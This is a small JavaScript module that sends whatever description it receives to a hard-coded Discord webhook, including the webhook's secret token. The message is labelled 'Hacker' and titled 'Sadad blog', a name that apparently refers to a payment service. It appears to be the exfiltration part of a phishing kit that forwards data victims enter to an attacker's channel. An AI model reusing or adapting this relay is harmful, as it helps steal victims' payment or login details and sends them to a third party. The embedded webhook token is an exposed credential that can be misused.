import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323657404411547708/jUSuAd9o_S0TL9rPhMEBSPZU-NLcFje14IBmp-odcH7HdyB6Bsj75wfUs8-PsTO9bReT",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
